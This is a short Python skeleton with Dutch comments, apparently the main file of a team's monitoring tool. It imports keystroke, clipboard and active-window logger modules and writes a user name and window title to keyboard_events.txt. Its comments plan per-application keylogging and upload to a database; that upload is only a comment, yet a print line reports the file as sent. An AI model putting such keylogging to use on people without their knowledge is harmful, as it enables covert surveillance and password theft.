########################################################################################################################
#               Dit is voor nu het main bestand voor de monitoringssoftware.                                           #
#               Probeer zoveel mogelijk code in functies/classes te plaatsen i.p.v. los.                               #
#               Als het nodig lijkt, bespreek met projectleden of er verschillende .py bestanden nodig zijn.           #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Hier alle library imports
import web_and_app_info_logger
import keystrokes_and_clipboard_logger
import os
import datetime


# Hieronder de relevante code
def main():
    if os.path.isfile("keyboard_events.txt"):
        # Code voor versturen van het bestand naar DB
        print("Bestand is verstuurd naar de database!")
    with open("keyboard_events.txt", 'w') as f:
        # V Voeg gebruikerID toe aan bovenkant .txt file.
        # 2. Controleer actieve applicatie, voeg toe aan .txt file
        # 3. Start keylogger vanaf moment dat applicatie activeert.
        # 4. Zodra andere applicatie activeert, stop vorige keylogger en start nieuwe.
        # 5. Plaats log van vorige keylogger onder applicatieregel in .txt file.
        f.write("Gebruiker: Keano S.")
        f.write("======================================================" + "\n")
        active_window, window_title = web_and_app_info_logger.active_window_grabber()
        f.write(f"" + window_title)



if __name__ == '__main__':
    main()